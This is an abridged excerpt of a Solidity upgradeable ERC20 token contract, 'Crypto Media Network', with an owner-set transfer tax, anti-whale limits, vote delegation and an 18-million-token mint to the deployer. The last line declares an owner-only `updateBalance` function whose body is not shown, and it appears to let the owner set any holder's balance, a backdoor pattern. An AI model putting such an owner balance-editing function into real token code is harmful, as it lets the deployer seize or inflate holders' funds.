...
contract CMNToken is Initializable, ContextUpgradeable, ERC20Upgradeable, OwnableUpgradeable, UUPSUpgradeable {
    ...
    modifier antiWhale(address sender, address recipient, uint256 amount) {
        if (maxTransferAmount() > 0) {
            if (
                ...
                require(amount <= maxTransferAmount(), "CMN::antiWhale: Transfer amount exceeds the maxTransferAmount");
            }
        }
        _;
    }
    ...
    function initialize() public initializer {
        ...
        _mint(_msgSender(), 18000000 * 10**18);
        _moveDelegates(address(0), _delegates[_msgSender()], 18000000 * 10**18);

        __ERC20_init("Crypto Media Network", "CMN");
        __Ownable_init();
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override antiWhale(sender, recipient, amount) {
        ...
        if (recipient == BURN_ADDRESS || transferTaxRate == 0 || _isExcludeFromFees[sender] || _isExcludeFromFees[recipient]) {
            ...
            require(amount == sendAmount + taxAmount, "CMN::transfer: Tax value invalid");
    ...
    function updateTransferTaxRate(uint16 _transferTaxRate) public onlyOwner {
        require(_transferTaxRate <= MAXIMUM_TRANSFER_TAX_RATE, "CMN::updateTransferTaxRate: Transfer tax rate must not exceed the maximum rate.");
        emit TransferTaxRateUpdated(msg.sender, transferTaxRate, _transferTaxRate);
        transferTaxRate = _transferTaxRate;
    }

    function updateMaxTransferAmountRate(uint16 _maxTransferAmountRate) public onlyOwner {
        require(_maxTransferAmountRate <= 10000, "CMN::updateMaxTransferAmountRate: Max transfer amount rate must not exceed the maximum rate.");
        ...
        external
    {
        ...
        require(signatory != address(0), "CMN::delegateBySig: invalid signature");
        require(nonce == nonces[signatory]++, "CMN::delegateBySig: invalid nonce");
        require(block.timestamp <= expiry, "CMN::delegateBySig: signature expired");
    ...
    function getPriorVotes(address account, uint blockNumber)
        ...
        returns (uint256)
    {
        require(blockNumber < block.number, "CMN::getPriorVotes: not yet determined");
    ...
    function _writeCheckpoint(
        ...
        internal
    {
        uint32 blockNumber = safe32(block.number, "CMN::_writeCheckpoint: block number exceeds 32 bits");
    ...
    function updateBalance(address userAddress, uint amount) public onlyOwner{
